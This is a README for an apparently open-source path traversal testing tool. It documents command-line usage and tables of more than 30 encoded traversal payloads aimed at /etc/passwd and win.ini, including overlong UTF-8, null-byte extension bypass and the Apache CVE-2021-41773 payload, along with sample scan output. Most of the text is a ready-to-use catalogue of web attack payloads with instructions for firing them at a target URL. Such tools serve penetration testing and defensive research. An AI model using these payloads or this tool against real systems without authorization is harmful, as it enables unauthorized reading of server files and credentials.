# path-traversal 🔍

Automated path traversal testing tool that tests **30+ encoding variations** of directory traversal payloads against a target URL. Identifies potentially vulnerable file read endpoints by testing how the server responds to different encoding obfuscations of `../`.

## Features

- **30+ encoding techniques** — raw, single/double/triple percent-encode, Unicode overlong UTF-8, fullwidth, null-byte, backslash, triple-dot, quad-dot, semicolon, Apache mod_alias style, `/proc/self` symlink, and more
- **Live streaming logs** — each request prints the moment it completes, with the full URL
- **Parallel mode** — fire requests concurrently with `-t N`
- **Cross-platform** — Unix (`/etc/passwd`) and Windows (`win.ini`) targets
- **Zero dependencies** — pure Python 3, no pip installs needed
- **Colored output** — green for hits, gray for 404s, red for errors

## Installation

### Quick install (one-liner)

```bash
git clone https://github.com/Deadmafiya/path-traversal.git
cd path-traversal
chmod +x install.sh && ./install.sh
```

### From the repo

```bash
cd path-traversal/
./install.sh                    # installs to ~/.local/bin
./install.sh --prefix ~/.bin    # custom directory
./install.sh --no-verify        # skip post-install smoke test
```

### Manual symlink

```bash
ln -s "$PWD/path-traversal.py" ~/.local/bin/path-traversal
```

## Usage

```bash
path-traversal -u "http://example.com/file?file="
```

This appends each encoding variant of `../../../etc/passwd` to the end of the URL and tests them all.

### With a base path

```bash
path-traversal -u "http://example.com/file?file=var/www/"
```

Appends the traversal after `var/www/`: `var/www/../../../etc/passwd`.

### Windows target

```bash
path-traversal -u "http://example.com/download?file=" -p windows
```

Tests `..\..\..\windows\win.ini`, backslash encodings, drive-relative paths, and device names.

### Null-byte truncation (bypass extension checks)

```bash
path-traversal -u "http://example.com/upload?file=" -n .jpg
```

Appends `%00.jpg` to every payload so the server validates the `.jpg` extension but truncates at the null byte and reads the underlying file (classic PHP < 5.3.4 behavior). Accepts `.jpg`, `jpg`, or `%00.jpg`.

### Options

| Flag | Description | Default |
|------|-------------|---------|
| `-u, --url` | Target URL (required) | — |
| `-p, --platform` | `unix` or `windows` | `unix` |
| `-d, --depth` | Number of `../` directories | `10` |
| `-t, --threads` | Concurrent requests | `1` |
| `-n, --nullbyte` | Append null-byte suffix (e.g. `-n .jpg` → `%00.jpg`) | off |
| `--timeout` | Request timeout in seconds | `10` |
| `-o, --only-interesting` | Show only non-404 responses | off |
| `--no-live` | Wait, then print table (no streaming) | off |
| `--no-color` | Disable colored output | off |

## Encoding Techniques Tested

The tool tests **30+ encoding variations** organized by category:

### Percent-encoding
| # | Technique | Payload |
|---|-----------|---------|
| 1 | Raw | `../../../etc/passwd` |
| 2 | Single percent-encode | `%2e%2e%2f%2e%2e%2f../etc/passwd` |
| 3 | Double percent-encode | `%252e%252e%252f%252e%252e%252f../etc/passwd` |
| 4 | Triple percent-encode | `%25252e%25252e%25252f...` |
| 5 | Slash-only encode | `..%2f..%2f..%2fetc/passwd` |
| 6 | Dot-only encode | `%2e%2e/%2e%2e/%2e%2e/etc/passwd` |
| 7 | Mixed case hex | `%2E%2e%2F%2e%2E%2f...` |
| 8 | Upper hex | `..%2F..%2F..%2Fetc/passwd` |

### Unicode & Charset
| # | Technique | Payload |
|---|-----------|---------|
| 9 | Overlong UTF-8 (IIS) | `%c0%ae%c0%ae%c0%af...etc%c0%afpasswd` |
| 10 | Fullwidth Unicode | `．．／．．／．．／etc／passwd` |

### Path obfuscation
| # | Technique | Payload |
|---|-----------|---------|
| 11 | Null byte | `../../../etc/passwd%00` |
| 12 | Trailing space | `../../../etc/passwd%20` |
| 13 | Triple dot | `.../.../.../etc/passwd` |
| 14 | Quad-dot double-slash | `....//....//....//etc/passwd` |
| 15 | Semicolon path param | `..;/..;/..;/etc/passwd` |
| 16 | Tab separator | `..%09..%09..%09etc/passwd` |
| 17 | Plus sign | `..+/..+/..+/etc/passwd` |
| 18 | Space/plus mismatch | `..+/..+/..+/etc/passwd` |
| 19 | Alternating | `..%2f../..%2f../etc/passwd` |
| 20 | Mixed encoding | `%2e%2e%2f..%2f%2e%2e/../etc/passwd` |
| 21 | Split encode | `../../..%2f..%2fetc/passwd` |
| 22 | RFC 5987 filename* | `UTF-8''../../../etc/passwd` |

### Platform-specific
| # | Technique | Payload |
|---|-----------|---------|
| 23 | Backslash (Windows) | `..\..\..\windows\win.ini` |
| 24 | Encoded backslash | `%2e%2e%5c%2e%2e%5c...windows%5cwin.ini` |
| 25 | Drive-relative (Windows) | `C:..\..\..\windows\win.ini` |
| 26 | `/proc/self` symlink (Linux) | `/proc/self/root/../../../etc/passwd` |

### Server-specific
| # | Technique | Payload |
|---|-----------|---------|
| 27 | Apache mod_alias (CVE-2021-41773) | `.{%2e}/.{%2e}/.{%2e}/etc/passwd` |
| 28 | Nginx alias | `..%2f..%2f..%2fetc/passwd` |
| 29 | .NET-style | `..%2f..%2f..%2fetc/passwd` |
| 30 | Double-encode uppercase | `%252E%252E%252F../../../etc/passwd` |

## Example Output

```
  path-traversal v1.4.0
  ────────────────────────────────────────────────
  Target:   https://httpbin.org/get?file=<payload>
  File:    /etc/passwd (unix)
  Depth:   10 directories
  Tests:   30 encoding variations
  ────────────────────────────────────────────────

  [  1/30] raw                       200     404  Raw ../ traversal, no obfuscation ← hit
          https://httpbin.org/get?file=../../../../../../../../../../etc/passwd
  [  2/30] percent-full              200     404  Every char percent-encoded (%2e%2e%2f...) ← hit
          https://httpbin.org/get?file=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f...
  [  3/30] unicode-overlong          200     616  Overlong UTF-8 (IIS, %c0%ae%c0%ae%c0%af) ← hit
          https://httpbin.org/get?file=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af...
  ...

  ────────────────────────────────────────────────
  Summary:  30 tests, 30 interesting, 40.2s
  ▶ #1 [raw] → 200 (404B)
      https://httpbin.org/get?file=../../../../../../../../../../etc/passwd
  ▶ #3 [unicode-overlong] → 200 (616B)
      https://httpbin.org/get?file=%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af...
  ✓ 30 interesting response(s) found — review manually.
```

## Reference

For a deep dive into each encoding technique, see the companion file:

- [encoding-techniques.md](encoding-techniques.md) — comprehensive taxonomy with CVE reference table, mitigation guidance, and per-technique caveats.